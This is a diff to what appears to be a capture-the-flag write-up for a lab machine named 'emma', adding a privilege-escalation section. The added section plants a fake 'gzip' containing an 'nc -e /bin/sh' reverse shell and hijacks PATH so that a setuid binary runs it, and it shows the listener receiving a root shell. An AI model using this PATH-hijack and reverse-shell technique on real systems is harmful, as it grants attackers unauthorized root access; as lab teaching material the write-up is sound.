@@ -87,7 +87,7 @@ MariaDB [users]> select * from users;
 └─$ ssh emma@10.0.2.171        
 emma@10.0.2.171's password: 5f******************************
 ```
-## Priv Esc 
+## Privileges Escalation
 ```console
 emma@emma:~$ sudo -l
 Matching Defaults entries for emma on emma:
@@ -107,4 +107,52 @@ emma@emma:~$ stat who
   Size: 16760           Blocks: 40         IO Block: 4096   regular file
 Device: 801h/2049d      Inode: 146490      Links: 1
 Access: (6750/-rwsr-s---)  Uid: (    0/    root)   Gid: ( 1000/    emma)
+```
+## 
+```console
+emma@emma:~$ cat who.c
+#include <stdio.h>
+#include <stdlib.h>
+void main(){
+setuid(0);
+setgid(0);
+printf("Im \n");
+system("/bin/id");
+setuid(1000);
+setgid(1000);
+printf("But now Im \n");
+system("/bin/id");
+}
+
+emma@emma:~$ sudo -u root /usr/bin/gzexe /bin/id
+/bin/id:         59.2%
+emma@emma:~$ cd /tmp
+emma@emma:/tmp$ echo "nc -e /bin/sh 10.0.2.15 4444" > gzip
+emma@emma:/tmp$ chmod +x gzip
+emma@emma:/tmp$ export PATH=/tmp:$PATH
+emma@emma:/tmp$ cd
+emma@emma:~$ ./who
+Im 
+(UNKNOWN) [10.0.2.15] 4444 (?) : Connection refused
+Cannot decompress /usr/bin/id
+
+```
+[listener]
+```console
+┌──(alienum㉿kali)-[~]
+└─$ nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.15] from 10.0.2.171 [10.0.2.171] 43986
+id
+whoami
+root
+ls
+flag.sh
+user.txt
+who
+who.c
+cd /root
+ls
+flag.sh
+root.txt
 ```
